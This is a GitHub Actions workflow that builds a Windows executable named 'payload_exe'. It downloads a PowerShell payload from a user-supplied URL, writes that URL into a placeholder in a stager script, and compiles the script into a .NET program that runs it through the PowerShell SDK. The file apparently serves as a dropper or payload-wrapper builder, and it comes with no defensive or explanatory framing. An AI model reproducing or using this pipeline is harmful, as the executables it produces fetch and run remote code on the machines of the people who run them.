name: Build PowerShell EXE using .NET

on:
  workflow_dispatch:
    inputs:
      payload_url:
        description: 'URL to fetch payload'
        required: true
        type: string

jobs:
  build:
    runs-on: windows-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Debug - List Files
        shell: powershell
        run: |
          Write-Host "[INFO] Listing all files in workspace:"
          Get-ChildItem -Path ${{ github.workspace }} -Recurse

      - name: Fetch Payload Script
        shell: powershell
        run: |
          $url = '${{ github.event.inputs.payload_url }}'
          Write-Host "[INFO] Fetching payload script from $url..."
          Invoke-WebRequest -Uri $url -OutFile 'payload.ps1'
          Write-Host "[INFO] Payload script downloaded as payload.ps1"

      - name: Locate static_code.ps1 and Inject URL
        shell: powershell
        run: |
          $scriptPath = "$env:GITHUB_WORKSPACE\static_code.ps1"

          if (-Not (Test-Path $scriptPath)) {
              Write-Host "[ERROR] static_code.ps1 not found at expected location: $scriptPath"
              exit 1
          }

          Write-Host "[INFO] Found static_code.ps1 at $scriptPath"
          $url = '${{ github.event.inputs.payload_url }}'
          (Get-Content -Path $scriptPath) -replace '__PAYLOAD_URL__', $url | Set-Content -Path $scriptPath
          Write-Host "[INFO] URL injected into static_code.ps1"

      - name: Install .NET SDK
        shell: powershell
        run: dotnet --version

      - name: Create .NET Console Project
        shell: powershell
        run: |
          dotnet new console -o PowerShellRunner
          cd PowerShellRunner
          dotnet add package Microsoft.PowerShell.SDK

      - name: Generate C# Code with Embedded PowerShell Script
        shell: powershell
        run: |
          $scriptPath = "$env:GITHUB_WORKSPACE\static_code.ps1"
          
          if (-Not (Test-Path $scriptPath)) {
              Write-Host "[ERROR] static_code.ps1 not found before embedding!"
              exit 1
          }

          Write-Host "[INFO] Reading PowerShell script..."
          $psScript = Get-Content -Path $scriptPath -Raw
          
          Write-Host "[INFO] Escaping PowerShell script for C#..."
          $escapedScript = $psScript -replace "\\", "\\\\" -replace "`"", "\\`"" -replace "`r?`n", "\n"

          $csharpCode = @"
          using System;
          using System.Management.Automation;

          class Program {
              static void Main() {
                  Console.WriteLine("[INFO] PowerShell execution started from C#.");
                  string script = @`"$escapedScript`";
                  
                  using (PowerShell ps = PowerShell.Create()) {
                      ps.AddScript(script);
                      var results = ps.Invoke();
                      Console.WriteLine("[INFO] Execution Results:");
                      foreach (var result in results) {
                          Console.WriteLine(result);
                      }
                      if (ps.HadErrors) {
                          Console.WriteLine("[ERROR] PowerShell encountered an error.");
                          foreach (var error in ps.Streams.Error) {
                              Console.WriteLine(error.ToString());
                          }
                      }
                  }
                  Console.WriteLine("[SUCCESS] PowerShell execution completed.");
                  Console.WriteLine("Press Enter to exit...");
                  Console.ReadLine();
              }
          }
          "@
          Set-Content -Path "$env:GITHUB_WORKSPACE\PowerShellRunner\Program.cs" -Value $csharpCode
          Write-Host "[SUCCESS] C# code written to PowerShellRunner/Program.cs"

      - name: Build EXE
        shell: powershell
        run: |
          cd PowerShellRunner
          dotnet build -c Release

      - name: Upload Executable
        uses: actions/upload-artifact@v4
        with:
          name: payload_exe
          path: PowerShellRunner/bin/Release/**/PowerShellRunner.exe






